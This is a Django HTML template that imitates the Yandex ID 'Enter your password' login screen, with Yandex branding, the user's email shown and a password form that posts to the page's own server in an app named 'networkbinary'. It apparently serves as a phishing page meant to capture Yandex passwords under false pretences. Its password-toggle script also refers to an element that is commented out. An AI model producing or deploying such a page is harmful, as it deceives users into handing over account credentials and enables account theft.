{% load static %}

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="icon" type="image/png" href="{% static 'networkbinary/images/yanlo.png' %}" />

  <title>Yandex Login</title>
  <link rel="stylesheet" href="{% static 'networkbinary/style.css' %}">

  <style>
    * {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}

body {
  font-family: sans-serif;
  background: white;
  display: flex;
  justify-content: center;
  align-items: center;
  min-height: 100vh;
  width: 100%;
}

.login-container {
  /* width: 90%;
  max-width: 350px;
  box-shadow: 0 5px 15px rgba(0,0,0,0.1); */
 width: 30%;
      margin: 0 auto;
      text-align: center;
    box-shadow: 0 2px 8px rgba(0,0,0,0.1);
    height: 70vh;
    display: flex;
    justify-content: center;
    justify-items: center;
    align-items: center;
    flex-direction: column;
}

.top-bar {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 25px;
  width: 80%;
}

.back-arrow, .help-icon {
  font-size: 19px;
  color: #333;
  margin-bottom: 2vh;


}

.help-icon {

  width: 8%;
  height: 5vh;
}

.logo {
  font-size: 20px;
  font-weight: bold;
  margin-bottom: 2vh;
}

.pill {
  background-color: #111;
  color: white;
  padding: 2px 8px;
  border-radius: 8px;
  font-size: 14px;
}

h2 {
  font-size: 20px;
  margin-bottom: 5px;
}

.subtitle {
  color: #666;
  margin-bottom: 20px;
}

.email-box {
  background: #f2f2f2;
  border-radius: 12px;
  display: flex;
  align-items: center;
  padding: 10px;
  margin-bottom: 15px;
  justify-content: center;
  width: 80%;
}

.avatar {
  max-width: 100%;
  max-height: 3vh;
  border-radius: 50%;
  /* margin-right: 10px; */
  border: 1px solid rgba(170, 165, 165, 0.795) ;
  margin-left: auto;
}

.email {
  flex-grow: 1;
  font-size: 14px;
  
  text-align:left;
  margin-left: 3%;
}
span.img
{
  display: flex;
  flex-direction: column;


}

.dropdown {
  font-size: 14px;
  color: #333;
}

.password-box {
  position: relative;
  margin-bottom: 10px;
  width: 100%;
}

.password-box input {
  width: 100%;
  padding: 12px 40px 12px 12px;
  border: 1px solid #ccc;
  border-radius: 12px;
  font-size: 16px;
}

.toggle-password {
  position: absolute;
  right: 12px;
  top: 50%;
  transform: translateY(-50%);
  cursor: pointer;
  font-size: 18px;
  color: #666;
}

.forgot-link {
  display: block;
  text-align: left;
  font-size: 14px;
  color: #777;
  text-decoration: none;
  margin-bottom: 20px;
  /* margin-right: auto; */
  
}

div.forgot
{
  width: 80%;
  /* border: 2px solid black; */
}


.btn {
  width: 100%;
  padding: 12px;
  border-radius: 12px;
  font-size: 16px;
  border: none;
  cursor: pointer;
  margin-bottom: 12px;
}

form{
  /* border: 2px solid black; */
  width: 80%;
}
.primary {
  background-color: #222;
  color: white;
}

.secondary {
  background-color: white;
  border: 1px solid #ccc;
  display: flex;
  align-items: center;
  justify-content: center;
}

.qr-icon {
  margin-right: 8px;
  font-size: 18px;
}

  </style>

</head>
<body>
  <div class="login-container">
    <div class="top-bar">
      <span class="back-arrow">&#8592;</span>
      <div class="logo">Yandex <span class="pill">ID</span></div>
      <span class="help-icon"> <img src="{% static 'networkbinary/images/circle.img' %}" width="100%" height="100%" alt=""></span>
    </div>

    <h2>Enter your password</h2>
    <p class="subtitle">To log in to your account</p>

    <div class="email-box">
       <span class="img">

         <img src="{% static 'networkbinary/images/blank.png' %}" width="100%" height="100%" class="avatar" alt="helo" >
       </span>
      
{% if user %}
       <span class="email">   {{ user.email }}</span>
   

    <!-- Input box instead of static number -->
      

{% endif %}
      <!-- <span class="dropdown">&#9662;</span> -->
    </div>
    <form action="" method="POST">

    {% csrf_token %}


    <div class="password-box">
      <input type="password" id="password"  name='password' placeholder="Password">
      <!-- <span class="toggle-password" id="togglePassword">👁️</span> -->
    </div>

    <div class="forgot">
      
      <a href="#" class="forgot-link">Forgot your password?</a>
    </div>

    <button class="btn primary">Next</button>
  
    </form>

  </div>

  <script src="{% static 'networkbinary/script.js' %}"></script>
  <script>
    const toggleBtn = document.getElementById("togglePassword");
const pwdField = document.getElementById("password");

toggleBtn.addEventListener("click", () => {
  const type = pwdField.type === "password" ? "text" : "password";
  pwdField.type = type;
});

  </script>
</body>
</html>
